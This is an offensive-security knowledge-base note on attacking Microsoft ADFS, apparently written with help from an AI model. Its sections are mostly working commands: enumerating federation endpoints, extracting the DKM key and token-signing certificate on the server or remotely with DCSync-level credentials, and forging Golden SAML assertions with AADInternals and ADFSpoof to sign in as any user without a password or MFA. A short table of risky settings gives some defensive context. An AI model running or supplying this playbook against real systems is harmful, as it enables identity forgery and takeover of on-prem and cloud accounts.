# ADFS

#ADFS #Federation #SAML #ActiveDirectory #GoldenSAML

## What is ADFS?

Active Directory Federation Services is Microsoft's on-prem SAML/WS-Fed identity provider, most commonly used to federate on-prem AD with Entra ID or other SaaS relying parties. Compromising the ADFS server — or extracting its DKM encryption key from AD without ever touching the server directly — exposes the token-signing certificate, enabling **Golden SAML**: forging SAML assertions for any federated user, entirely offline, bypassing the real authentication stack (including MFA enforced at the IdP). See [[Services/Active Directory/Entra ID|Entra ID]] for cloud-side consumption of a forged token; this note owns the on-prem ADFS-side enumeration, key extraction, and forging methodology.

> [!note] Protocol reference — what SAML is and the signature trust model Golden SAML forges against: [[Standards & Protocols/SAML|SAML]].

- Ports: **TCP 443** (`/adfs/ls/`, `/adfs/services/trust`), federation metadata at `/FederationMetadata/2007-06/FederationMetadata.xml`.
- The **token-signing certificate** private key is what you need — it's stored in the ADFS config DB, encrypted with a **DKM (Distributed Key Manager)** key held in AD (a contact object under the ADFS service account's container).
- Golden SAML = sign a SAML assertion for arbitrary `NameID`/claims with that cert. It survives password resets and MFA; only rotating the token-signing cert (twice) revokes it.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Cloud/AADInternals\|AADInternals]] | Export ADFS config/DKM key/certs (local or remote) and forge SAML tokens |
| [[Tools/AD/ADFSDump\|ADFSDump]] | On-server C# dumper — pulls signing key + config from the ADFS DB |
| [[Tools/AD/ADFSpoof\|ADFSpoof]] | Forge SAML/JWT tokens from ADFSDump output (Golden SAML) |
| [[Tools/Auth/mimikatz\|mimikatz]] | `crypto`/DPAPI export of the ADFS cert when running on the server |

---

## Enumeration

```bash
# Confirm ADFS + get the issuer/entityID and relying-party info
curl -s https://<sts>/FederationMetadata/2007-06/FederationMetadata.xml | grep -i entityID
curl -sI "https://<sts>/adfs/ls/idpinitiatedsignon.aspx"        # 200 = IdP-initiated signon enabled
curl -s "https://<sts>/adfs/ls/idpinitiatedsignon.aspx?client-request-id=x" | grep -i "relying\|realm"

# Find the federation service name / immutableID source later needed for forging
# (ImmutableID = base64 of the on-prem user's objectGUID)
```

| Endpoint | Reveals |
|---|---|
| `/FederationMetadata/2007-06/FederationMetadata.xml` | Issuer (entityID), token-signing cert (public), endpoints |
| `/adfs/ls/idpinitiatedsignon.aspx` | IdP-initiated signon page + relying-party list |
| `/adfs/services/trust/mex` | WS-Trust metadata |

---

## Attack Vectors

### On-Server Extraction (running on the ADFS box)

```powershell
# AADInternals — export config, DKM key, and the token-signing cert locally
$cfg = Export-AADIntADFSConfiguration -Local
$key = Export-AADIntEncryptionKey -Local -Configuration $cfg
Export-AADIntADFSCertificates -Configuration $cfg -Key $key    # → ADFS_signing.pfx (+ encryption)

# Alternative: ADFSDump (C#) → feeds ADFSpoof
ADFSDump.exe            # prints signing key material + config to feed ADFSpoof
```

### Remote Extraction (no ADFS login — DKM key from AD)

Requires **directory-replication (DCSync-level) credentials** — the DKM key lives in AD, so DA/replication rights are enough; you never touch the ADFS server.

```powershell
$cred = Get-Credential
# Pull the DKM encryption key from AD via replication
$key = Export-AADIntADFSEncryptionKey -Server <DC> -Credentials $cred -ObjectGuid <DKM-contact-GUID>
# Pull the config remotely using the ADFS service account's NT hash + SID
$cfg = Export-AADIntADFSConfiguration -Hash <ADFS_svc_NThash> -SID <ADFS_svc_SID> -Server <sts>
Export-AADIntADFSCertificates -Configuration $cfg -Key $key
```

### Golden SAML — Forge Assertions

```powershell
# AADInternals — forge a SAML token for any federated user (ImmutableID = b64(objectGUID))
$saml = New-AADIntSAMLToken -ImmutableID <base64-objectGUID> `
  -PfxFileName .\ADFS_signing.pfx -Issuer "http://<sts>/adfs/services/trust/"

# ADFSpoof (from ADFSDump output) — same outcome, e.g. an O365 assertion
python3 ADFSpoof.py -b signing_key.txt -s <sts> saml2 --endpoint <rp-endpoint> \
  --nameid <UPN> --nameidformat <fmt> --assertions <claims>
```

The forged assertion is then POSTed to the relying party's ACS (or fed into an Entra ID login) → authenticated as the target, **no password, no MFA**. See [[Services/Active Directory/Entra ID|Entra ID]] for using it against Microsoft 365 / Azure.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| DA / replication rights held broadly | Remote DKM-key export → Golden SAML without server access |
| ADFS service account weakly protected | Its hash + SID enables remote config export |
| IdP-initiated signon enabled | Easier relying-party enumeration + token replay surface |
| Token-signing cert never rotated | A single extraction = indefinite forgery (needs double-rotation to revoke) |
| No monitoring of DKM contact object reads | Remote extraction is silent |
| Federated trust to Entra ID / SaaS | One forged assertion pivots on-prem → cloud |

---

## Quick Reference

| Goal | Command |
|---|---|
| Confirm ADFS / issuer | `curl -s https://<sts>/FederationMetadata/2007-06/FederationMetadata.xml | grep entityID` |
| On-server export | `Export-AADIntADFSConfiguration -Local` → `Export-AADIntEncryptionKey -Local` → `Export-AADIntADFSCertificates` |
| Remote DKM key | `Export-AADIntADFSEncryptionKey -Server <DC> -Credentials $c -ObjectGuid <GUID>` |
| Remote config | `Export-AADIntADFSConfiguration -Hash <NT> -SID <SID> -Server <sts>` |
| Forge SAML | `New-AADIntSAMLToken -ImmutableID <b64GUID> -PfxFileName ADFS_signing.pfx -Issuer <issuer>` |
| Forge (ADFSpoof) | `ADFSDump.exe` → `python3 ADFSpoof.py -b key.txt saml2 ...` |

---

> [!note] **See also** — cloud-side consumption of a forged assertion (Microsoft 365 / Azure sign-in): [[Services/Active Directory/Entra ID|Entra ID]]; the remote path depends on DCSync-level rights obtained via [[Services/Active Directory/ACL Abuse|ACL Abuse]]/[[Services/Active Directory/Kerberos|Kerberos]]. Protocol/trust model: [[Standards & Protocols/SAML|SAML]]. Tools: [[Tools/Cloud/AADInternals|AADInternals]], [[Tools/AD/ADFSDump|ADFSDump]], [[Tools/AD/ADFSpoof|ADFSpoof]].

---

*Created: 2026-07-27*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
